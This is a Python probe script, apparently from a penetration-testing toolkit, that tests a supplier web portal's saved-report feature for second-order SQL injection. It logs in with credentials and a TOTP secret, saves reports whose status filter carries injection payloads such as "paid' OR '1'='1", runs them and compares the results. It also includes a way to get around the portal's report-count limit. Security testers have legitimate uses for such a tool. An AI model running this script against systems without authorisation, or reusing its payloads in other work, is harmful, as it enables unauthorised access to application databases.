#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""report_probe.py —— 保存报表/定时报表的二阶注入取证。

模式：保存筛选器（创建时安全）→ 运行（重放时拼接）。
常见注入位：status/region/channel 等自由文本；dimension 往往是白名单。

用法：
  python report_probe.py --base https://host --email merchant@x --password ... \
      --totp-secret BASE32 --payload "paid' OR '1'='1" --payload "paid' AND 1=2"

  # 只运行已有报表（不新建，绕过“最多 N 条”限制）
  python report_probe.py ... --existing-id 2

输出：每个 payload 的创建结果、运行状态、行数/错误；不做破坏性写操作。
"""
import argparse
import html
import json
import os
import re
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import httpkit
from findings import FindingStore


def csrf_of(text):
    m = re.search(r'name="_csrf"\s+value="([^"]+)"', text or "")
    return m.group(1) if m else None


def run_rows(page_text):
    rows = []
    for row in re.findall(r"<tr[^>]*>(.*?)</tr>", page_text or "", re.S):
        t = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", row)).strip()
        if t:
            rows.append(t)
    return rows


def parse_run(page_text, name):
    for t in run_rows(page_text):
        if name in t:
            m = re.search(r"(已完成|失败)\s*[—-]?\s*(.*)", t)
            return {"row": t[:600], "status": m.group(1) if m else "unknown",
                    "detail": m.group(2) if m else ""}
    return None


def make_client(args):
    c = httpkit.HttpClient(base_url=args.base, cookie=args.cookie,
                           cookie_jar=args.cookie_jar, rps=args.rps,
                           timeout=args.timeout, evidence_dir=args.evidence_dir)
    if args.email and not args.cookie_jar and not args.cookie:
        c.login(args.login_url, {"email": args.email, "password": args.password},
                csrf_url=args.login_url, totp_secret=args.totp_secret)
    return c


def create_report(c, args, name, status):
    page = c.get(args.list_path, tag="report-list")
    csrf = csrf_of(page["text"])
    if not csrf:
        return {"error": "no csrf; session invalid", "page": page["text"][:300]}
    data = {"_csrf": csrf, "name": name, "dimension": args.dimension,
            "status": status, "from": args.date_from, "to": args.date_to}
    r = c.post(args.create_path, data=data, headers={"Referer": args.base + args.list_path},
               tag="report-create-" + name)
    after = c.get(args.list_path, tag="report-list-after-create")
    ids = [int(i) for i in re.findall(r"/reports/(\d+)/run", after["text"])]
    # 也兼容 /supplier/reports/...
    ids += [int(i) for i in re.findall(r"/reports/(\d+)/run", after["text"])]
    ids = sorted(set(ids))
    return {"create_status": r["status"], "create_url": r["url"], "ids": ids,
            "page": after["text"]}


def run_report(c, args, rid):
    page = c.get(args.list_path, tag="report-list-before-run")
    csrf = csrf_of(page["text"])
    if not csrf:
        return {"error": "no csrf"}
    r = c.post("%s/%d/run" % (args.create_path, rid), data={"_csrf": csrf},
               headers={"Referer": args.base + args.list_path}, tag="report-run-%d" % rid)
    time.sleep(args.wait)
    after = c.get(args.list_path, tag="report-list-after-run")
    return {"run_status": r["status"], "run_url": r["url"], "page": after["text"]}


def main():
    p = argparse.ArgumentParser(description="Second-order SQLi in saved reports")
    p.add_argument("--base", required=True)
    p.add_argument("--login-url", default="/login")
    p.add_argument("--email", default=None)
    p.add_argument("--password", default=None)
    p.add_argument("--totp-secret", default=None)
    p.add_argument("--cookie", default=None)
    p.add_argument("--cookie-jar", default=None)
    p.add_argument("--create-path", default="/supplier/reports")
    p.add_argument("--list-path", default="/supplier/reports")
    p.add_argument("--dimension", default="status")
    p.add_argument("--date-from", default="2026-01-01")
    p.add_argument("--date-to", default="2026-12-31")
    p.add_argument("--payload", action="append", default=[], help="status 字段载荷，可重复")
    p.add_argument("--name-prefix", default="probe")
    p.add_argument("--existing-id", type=int, default=None, help="只运行已有报表，不新建")
    p.add_argument("--wait", type=float, default=4)
    p.add_argument("--rps", type=float, default=1.0)
    p.add_argument("--timeout", type=float, default=45)
    p.add_argument("--out", default="report-findings.json")
    p.add_argument("--evidence-dir", default="report-raw")
    args = p.parse_args()
    if not args.payload:
        args.payload = ["paid"]
    c = make_client(args)
    store = FindingStore(args.out)

    if args.existing_id:
        res = run_report(c, args, args.existing_id)
        page = res.get("page", "")
        parsed = parse_run(page, args.name_prefix) if page else None
        print(json.dumps({"existing_id": args.existing_id, "run": res.get("run_status"),
                          "parsed": parsed}, ensure_ascii=False, indent=2))
        store.add(module="report", title="已运行已有报表（二阶注入位点）", severity="info",
                  endpoint=args.base + args.create_path, method="POST", confidence="surface",
                  evidence={"existing_id": args.existing_id, "run_status": res.get("run_status"),
                            "parsed": parsed},
                  impact="需要观察运行结果/错误来判断是否注入。", remediation="—",
                  tags=["report", "second-order"])
        store.save()
        return

    baseline_rows = None
    for i, payload in enumerate(args.payload, 1):
        name = "%s-%d" % (args.name_prefix, i)
        cr = create_report(c, args, name, payload)
        if "error" in cr:
            print("CREATE ERR", cr["error"]); continue
        ids = cr.get("ids") or []
        if not ids:
            print("CREATE no new report (limit/rejected):", cr.get("create_status"),
                  re.sub(r"\s+", " ", html.unescape(re.sub(r"<[^>]+>", " ", cr.get("page", ""))))[-200:])
            continue
        rid = max(ids)
        rr = run_report(c, args, rid)
        page = rr.get("page", "")
        parsed = parse_run(page, name) or {}
        m = re.search(r"(\d+)", parsed.get("row", ""))
        # 结果行数：优先找“已完成 N”；否则看错误
        line = parsed.get("row", "")
        print("PAYLOAD", i, "report", rid, "|", parsed.get("status"), "|", line[:260])
        store.add(module="report", title="保存报表二阶注入测试", severity="info",
                  endpoint=args.base + args.create_path, method="POST",
                  confidence="needs-review",
                  evidence={"payload": payload, "report_id": rid,
                            "run_status": rr.get("run_status"), "result": line[:600]},
                  impact="按结果是否随布尔/报错变化确认二阶注入。", remediation="—",
                  tags=["report", "second-order", "sqli"])
    store.save()
    print(json.dumps(store.summary(), ensure_ascii=False))
    print("findings:", os.path.abspath(args.out))


if __name__ == "__main__":
    main()
